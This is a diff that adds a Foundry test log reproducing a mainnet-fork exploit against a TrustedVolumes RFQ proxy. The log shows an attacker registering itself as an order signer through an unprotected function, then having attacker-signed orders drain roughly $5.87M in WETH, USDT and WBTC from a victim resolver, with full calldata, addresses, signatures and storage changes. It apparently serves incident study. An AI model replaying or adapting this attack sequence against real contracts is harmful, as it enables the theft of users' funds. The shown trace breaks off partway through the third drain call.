@@ -1,0 +1,356 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/TrustedVolumes_exp.sol:TrustedVolumesExploit
+[PASS] testExploit() (gas: 767838)
+Logs:
+  --- TrustedVolumes RFQ proxy drain (permissionless signer + wrong-key authorization) ---
+  Attack date: May 7, 2026  Chain: Ethereum  Block: 25039670
+
+  Victim resolver approval to proxy (WETH): 115792089237316195423570985008687907853269984665640564039457584007913129639935
+  Victim resolver balances before:
+    WETH: 1304203136581696140677
+    USDT: 208366107956
+    WBTC: 1711020727
+    USDC: 1281587362505
+  
+[Bug #1] registerAllowedOrderSigner(attackerEOA, true) succeeded with NO access control.
+  
+[Bug #2] Attacker-signed orders accepted; victim maker drained.
+  Stolen by attack contract:
+    WETH: 1291161105215879179270
+    USDT: 206282446876
+    WBTC: 1693910519
+    USDC: 1268771488879
+  
+Approx USD value (round figures): ~$5.87M
+  
+Exploit reproduced: unlimited maker approval + permissionless signer + wrong-key auth = full drain.
+
+Traces:
+  [9450] TrustedVolumesExploit::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 25039669 [2.503e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(RFQ_Proxy: [0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756], "RFQ_Proxy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], "AttackContract(taker)")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker(signer): [0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100], "Attacker(signer)")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], "VictimResolver(maker)")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], "WBTC")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [847438] TrustedVolumesExploit::testExploit()
+    ├─ [0] console::log("--- TrustedVolumes RFQ proxy drain (permissionless signer + wrong-key authorization) ---") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attack date: May 7, 2026  Chain: Ethereum  Block: %s\n", 25039670 [2.503e7]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2534] WETH::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   └─ ← [Return] 1304203136581696140677 [1.304e21]
+    ├─ [5031] USDT::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   └─ ← [Return] 208366107956 [2.083e11]
+    ├─ [2795] WBTC::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   └─ ← [Return] 1711020727 [1.711e9]
+    ├─ [9839] USDC::fallback(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [delegatecall]
+    │   │   └─ ← [Return] 1281587362505 [1.281e12]
+    │   └─ ← [Return] 1281587362505 [1.281e12]
+    ├─ [2717] WETH::allowance(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], RFQ_Proxy: [0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] console::log("Victim resolver approval to proxy (WETH):", 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Victim resolver balances before:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  WETH:", 1304203136581696140677 [1.304e21]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  USDT:", 208366107956 [2.083e11]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  WBTC:", 1711020727 [1.711e9]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  USDC:", 1281587362505 [1.281e12]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [3339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [1339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48])
+    │   └─ ← [Return] [0x10d6a54a4754c8869d6886b5f5d7fbfa5b4522237ea5c60d11bc4e7a1ff9390b, 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3, 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17], []
+    ├─ [0] VM::load(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], slot: 107236567228201066483244774804655830159824923078113160137152207546494994967575 [1.072e77])
+    ├─ [0] VM::load(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [1339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [1339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 57896044618658097711785492504343953926634992332820282019728792003956564819967 [5.789e76]
+    │   └─ ← [Return] 57896044618658097711785492504343953926634992332820282019728792003956564819967 [5.789e76]
+    ├─ [0] VM::store(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], fsig: 0x70a08231, keysHash: 0xee326cd4a1890d0a227c1704ea5764017cf57d39e9a3b9420e13fb1fcad266b9, slot: 107236567228201066483244774804655830159824923078113160137152207546494994967575 [1.072e77])
+    ├─ [0] VM::load(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17, 0x0000000000000000000000000000000000000000000000000000000000000004)
+    │   └─ ← [Return]
+    ├─ [1339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 4
+    │   └─ ← [Return] 4
+    ├─ [0] VM::startPrank(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95])
+    │   └─ ← [Return]
+    ├─ [27462] USDC::fallback(RFQ_Proxy: [0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [26673] FiatTokenV2_2::approve(RFQ_Proxy: [0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], spender: RFQ_Proxy: [0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe5611bf39b6895f47bca08debbe73baeccee3b3a6818916247c55cf9eb71ca87: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [28243] RFQ_Proxy::registerAllowedOrderSigner(Attacker(signer): [0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100], true)
+    │   ├─ [23046] 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8::registerAllowedOrderSigner(Attacker(signer): [0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100], true) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x97aea019088a0ba30b7a7ccfe628286b94c299fd7edd51edd2577a5a63a4062e: 0 → 1
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] console::log("\n[Bug #1] registerAllowedOrderSigner(attackerEOA, true) succeeded with NO access control.") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [137863] RFQ_Proxy::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000045fe75b854413cec06000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001b4f6496eb7ebd74e91df255d580b631e48513f271c60994253411dcf2e1aeb4c00b1ad0f7ff67e96997d22b14aa0908b147b6b71bf76c3ef3f41a9c3a35eda6910000000000000000000000000000000000000000000000000000000000000002)
+    │   ├─ [135106] 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000045fe75b854413cec06000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001b4f6496eb7ebd74e91df255d580b631e48513f271c60994253411dcf2e1aeb4c00b1ad0f7ff67e96997d22b14aa0908b147b6b71bf76c3ef3f41a9c3a35eda6910000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0xc7a773cf622879999999e5b513df2f89356a45fe136319d824e3d27325074305, 27, 35910441355442655188103165302952697514214445107091008843700957850974106334400, 5022821607344508685367284782090362186064343864478802384603713523773384533649) [staticcall]
+    │   │   │   └─ ← [Return] 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100
+    │   │   ├─ [3164] USDC::fallback() [staticcall]
+    │   │   │   ├─ [2381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 6
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [15642] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   ├─ [7409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 930, 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 930
+    │   │   │   └─ ← [Return] 55340232221128655778 [5.534e19], 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 55340232221128655778 [5.534e19]
+    │   │   ├─ [2444] WETH::decimals() [staticcall]
+    │   │   │   └─ ← [Return] 18
+    │   │   ├─ [15642] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::latestRoundData() [staticcall]
+    │   │   │   ├─ [7409] 0x7d4E742018fb52E48b08BE73d041C18B21de6Fb5::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 28875 [2.887e4], 233649970000 [2.336e11], 1778114669 [1.778e9], 1778114699 [1.778e9], 28875 [2.887e4]
+    │   │   │   └─ ← [Return] 129127208515966890187 [1.291e20], 233649970000 [2.336e11], 1778114669 [1.778e9], 1778114699 [1.778e9], 129127208515966890187 [1.291e20]
+    │   │   ├─ [28125] WETH::transferFrom(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], 1291161105215879179270 [1.291e21])
+    │   │   │   ├─ emit Transfer(from: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], to: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], value: 1291161105215879179270 [1.291e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xae1a48f601db8e20f58f075f6461077f51c3ceb8bbb0963d79c79f33dec12ec9: 0x000000000000000000000000000000000000000000000046b37452c1b642b585 → 0x000000000000000000000000000000000000000000000000b4fe9a6d7505c97f
+    │   │   │   │   @ 0x5e1de49d7498bf8e23d8056c6cb9bcff208dc51763eb3b03983a3f4713311085: 0 → 0x000000000000000000000000000000000000000000000045fe75b854413cec06
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [11349] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1)
+    │   │   │   ├─ [10554] FiatTokenV2_2::transferFrom(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], to: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], value: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xdc9dbe2f670e24af26fbe3979b15a6bd881b67fab7d0677ad2bf1600f76ac709: 0x0000000000000000000000000000000000000000000000000000012a648f3ac9 → 0x0000000000000000000000000000000000000000000000000000012a648f3aca
+    │   │   │   │   │   @ 0xe5611bf39b6895f47bca08debbe73baeccee3b3a6818916247c55cf9eb71ca87: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe
+    │   │   │   │   │   @ 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17: 4 → 3
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
+    │   │   │        topic 1: 0x000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c0389100
+    │   │   │        topic 2: 0xc7a773cf622879999999e5b513df2f89356a45fe136319d824e3d27325074305
+    │   │   │           data: 0x000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa639be9e2283ef55ae5675eda0d7053ae10004f467b150e19dbe48eee9c062ca: 0 → 0x0000000000000000000000000000000000000000000000000000000080000003
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [119351] RFQ_Proxy::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000300764581c000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001c957d7e01305f29e1b3c38169aa877e2e3d7250a25363231074f027462cebb0c243ee738d4a0abe1f96b78c82cefe32af7ba4ad064f270dd0bf417f33726f4bb80000000000000000000000000000000000000000000000000000000000000002)
+    │   ├─ [118594] 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000300764581c000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001c957d7e01305f29e1b3c38169aa877e2e3d7250a25363231074f027462cebb0c243ee738d4a0abe1f96b78c82cefe32af7ba4ad064f270dd0bf417f33726f4bb80000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0xf41eb4fe0ea67880d4edd2ff1d6a627175e36593af55ef55d39966201656c28c, 28, 67616339974097770221553690252947627474635817306555633480007715416080959385794, 30726267966475993335909977206005822801043596990025827826728985757159164693432) [staticcall]
+    │   │   │   └─ ← [Return] 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100
+    │   │   ├─ [1164] USDC::fallback() [staticcall]
+    │   │   │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 6
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [3142] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   ├─ [1409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 930, 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 930
+    │   │   │   └─ ← [Return] 55340232221128655778 [5.534e19], 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 55340232221128655778 [5.534e19]
+    │   │   ├─ [2484] USDT::decimals() [staticcall]
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [15642] 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D::latestRoundData() [staticcall]
+    │   │   │   ├─ [7409] 0x0d5F4aADf3fde31BBB55dB5F42C080F18aD54Df5::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 669, 99988156 [9.998e7], 1778094109 [1.778e9], 1778094131 [1.778e9], 669
+    │   │   │   └─ ← [Return] 55340232221128655517 [5.534e19], 99988156 [9.998e7], 1778094109 [1.778e9], 1778094131 [1.778e9], 55340232221128655517 [5.534e19]
+    │   │   ├─ [39630] USDT::transferFrom(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], 206282446876 [2.062e11])
+    │   │   │   ├─ emit Transfer(from: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], to: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], value: 206282446876 [2.062e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xbf5ddd02ad61e395c72fbb52c2d3756a5f06da5366f53e81e8d71e4edd948275: 0x0000000000000000000000000000000000000000000000000000003083967d34 → 0x000000000000000000000000000000000000000000000000000000007c322518
+    │   │   │   │   @ 0xfd925c8ae48eea6221376df7ea35af245118749e85a8293771c4f6e797fd5392: 0 → 0x000000000000000000000000000000000000000000000000000000300764581c
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [6549] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1)
+    │   │   │   ├─ [5754] FiatTokenV2_2::transferFrom(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], to: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], value: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17: 3 → 2
+    │   │   │   │   │   @ 0xe5611bf39b6895f47bca08debbe73baeccee3b3a6818916247c55cf9eb71ca87: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd
+    │   │   │   │   │   @ 0xdc9dbe2f670e24af26fbe3979b15a6bd881b67fab7d0677ad2bf1600f76ac709: 0x0000000000000000000000000000000000000000000000000000012a648f3aca → 0x0000000000000000000000000000000000000000000000000000012a648f3acb
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
+    │   │   │        topic 1: 0x000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c0389100
+    │   │   │        topic 2: 0xf41eb4fe0ea67880d4edd2ff1d6a627175e36593af55ef55d39966201656c28c
+    │   │   │           data: 0x000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000000000000000000000000000000000000000000002
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x532499fd5b9cfcc8213f64604c30e2113c29f6b4001d6379374013daef5b2eb4: 0 → 0x0000000000000000000000000000000000000000000000000000000080000003
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [114395] RFQ_Proxy::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59900000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000064f705f7000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001c39a0cb78995ca12d4999f1594e6fd0cc4c8ad9db63f268c38a6f5297806927c904190fdbb1d3a4aa8d58b5125ff293aa8888a9d7891b94dfcecd4500b27b9d270000000000000000000000000000000000000000000000000000000000000002)
+    │   ├─ [113638] 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59900000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000064f705f7000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001c39a0cb78995ca12d4999f1594e6fd0cc4c8ad9db63f268c38a6f5297806927c904190fdbb1d3a4aa8d58b5125ff293aa8888a9d7891b94dfcecd4500b27b9d270000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x8f137d78ca15c264a1745fc50439022feb1d3d120e255e6c53194c86957209a1, 28, 26065932205463610403945470019694751369640874595415994615452007590530724210633, 1853532020103387725325481198752512250993947887572687108143557560908019113255) [staticcall]
+    │   │   │   └─ ← [Return] 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100
+    │   │   ├─ [1164] USDC::fallback() [staticcall]
+    │   │   │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 6
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [3142] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   ├─ [1409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 930, 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 930
+    │   │   │   └─ ← [Return] 55340232221128655778 [5.534e19], 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 55340232221128655778 [5.534e19]
+    │   │   ├─ [2431] WBTC::decimals() [staticcall]
+    │   │   │   └─ ← [Return] 8
+    │   │   ├─ [15642] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::latestRoundData() [staticcall]
+    │   │   │   ├─ [7409] 0x4a3411ac2948B33c69666B35cc6d055B27Ea84f1::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 20303 [2.03e4], 8104728979041 [8.104e12], 1778114529 [1.778e9], 1778114543 [1.778e9], 20303 [2.03e4]
+    │   │   │   └─ ← [Return] 129127208515966881615 [1.291e20], 8104728979041 [8.104e12], 1778114529 [1.778e9], 1778114543 [1.778e9], 129127208515966881615 [1.291e20]
+    │   │   ├─ [34470] WBTC::transferFrom(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], 1693910519 [1.693e9])
+    │   │   │   ├─ emit Transfer(from: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], to: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], value: 1693910519 [1.693e9])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xee326cd4a1890d0a227c1704ea5764017cf57d39e9a3b9420e13fb1fcad266b9: 0 → 0x0000000000000000000000000000000000000000000000000000000064f705f7
+    │   │   │   │   @ 0x8005018a7aa0a498a6e36fcde9b225c514bf6c7692597ce8df9deb02f91edb41: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff9b08fa08
+    │   │   │   │   @ 0xc0ef1876f9d1bb333864708daf73371f1d6a0f3a00a623b06f41b67c85b82751: 0x0000000000000000000000000000000000000000000000000000000065fc1ab7 → 0x00000000000000000000000000000000000000000000000000000000010514c0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [6549] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1)
+    │   │   │   ├─ [5754] FiatTokenV2_2::transferFrom(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], to: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], value: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xdc9dbe2f670e24af26fbe3979b15a6bd881b67fab7d0677ad2bf1600f76ac709: 0x0000000000000000000000000000000000000000000000000000012a648f3acb → 0x0000000000000000000000000000000000000000000000000000012a648f3acc
